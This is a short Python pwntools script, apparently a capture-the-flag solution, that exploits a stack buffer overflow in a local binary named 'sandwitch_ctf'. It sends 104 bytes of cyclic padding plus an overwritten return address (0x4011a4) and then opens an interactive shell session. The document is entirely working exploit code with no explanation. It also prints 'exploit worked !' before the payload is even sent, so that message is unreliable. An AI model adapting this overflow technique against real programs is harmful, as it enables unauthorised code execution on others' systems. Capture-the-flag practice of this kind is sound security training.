#!/usr/bin/python3
from pwn import *

class Exploit:
	def __init__(self,shellcode):
		self.shellcode = shellcode
		self.payload = self.shellcode

	def exploit(self):
		try:
			x = log.progress("")
			start_process = process("./sandwitch_ctf")
			if start_process:
				x.status("spawning shell...")
				x.success("exploit worked !")
				start_process.sendline(self.payload)
				start_process.interactive()
			else:
				x.failure("exploit failed...")

		except Exception as e:
			print(e)

if __name__ == '__main__':
	shellcode = cyclic(104) + p64(0x00000000004011a4)
	exploit = Exploit(shellcode)
	exploit.exploit()
